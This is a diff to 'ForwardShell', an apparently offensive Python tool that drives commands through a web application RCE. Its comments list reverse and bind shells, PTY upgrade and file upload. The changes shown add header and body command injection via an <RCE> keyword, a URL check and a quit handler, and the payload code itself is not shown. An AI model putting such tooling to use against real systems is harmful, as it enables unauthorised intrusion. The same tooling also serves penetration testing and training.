@@ -1,8 +1,9 @@
 #!/usr/bin/python3
 #
-# This is a semiautomatic shell you can use if you get a simple Webshell RCE.
+# This is a semiautomatic shell you can use if you get a simple web application RCE.
 # ForwardShell has some nice features:
-# - Upgrade your shell to a PTY with Python
+# - Put your command in the GET URL, in the POST body or in a certain header by using the keyword <RCE>
+# - Upgrade your web shell to a PTY with Python
 # - ReverseShell in Bash, Python, Netcat and Perl
 # - BindShell in Python, Netcat and Perl
 # - File upload
@@ -11,16 +12,17 @@
 # Author: 61106960
 # Credits to ippsec and 0xdf for their initial idea of a shell like this
 
+import argparse
 import base64
+import gzip
+import os
 import random
+import re
 import requests
 import threading
 import time
-import argparse
+import signal
 import sys
-import os
-import gzip
-import re
 import urllib.parse
 from os.path import dirname
 from urllib3.exceptions import InsecureRequestWarning
@@ -51,6 +53,12 @@ class WebShell(object):
         self.verbose = options.verbose
         self.display_prefix = options.prefix
         self.display_suffix = options.suffix
+
+        # Check if the provided url starts with http...
+        if not self.url.startswith('http'):
+            print(f'[ERROR] Your URL {self.url} does not start with http...\n')
+            parser.print_help()
+            exit()
 
         # Set up proxy
         self.proxies = {}
@@ -115,12 +123,14 @@ class WebShell(object):
         if CheckConnction:
              CheckConnction = CheckConnction.rstrip()
         if CheckConnction == f'{self.stdout}':
-            print(f"[+] Connection to {self.url} established")
+            print(f"[+] Connection to {self.uri_parser(self.url)} established")
             ClearOutput = f'{self.ECHO} -n "" > {self.stdout}'
             self.RunRawCmd(ClearOutput)
         else:
-            print(f"[ERROR] Cannot connect to {self.url}")
+            print(f"[ERROR] Cannot connect to {self.uri_parser(self.url)}")
             exit()
+
+        signal.signal(signal.SIGINT, self.signal_handler)
 
         # Set up read thread
         self.stop_threads = False
@@ -707,6 +717,12 @@ class WebShell(object):
         parsed_uri = urllib.parse.urlparse(url)
         result = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
         return result[:-1]
+
+    # Stop the program gracefully
+    def signal_handler(signal, frame, args):
+        print("Ok ok, I am quitting...")
+        S.killCmd()
+        sys.exit(1)
     
 ######################################################################################
 #                                                                                    #
@@ -717,7 +733,7 @@ class WebShell(object):
 # Process command-line arguments.
 if __name__ == '__main__':
     __progname__ = 'ForwardShell'
-    __version__ = '0.3.0'
+    __version__ = '0.3.1'
 
     parser = argparse.ArgumentParser(
         add_help=True,
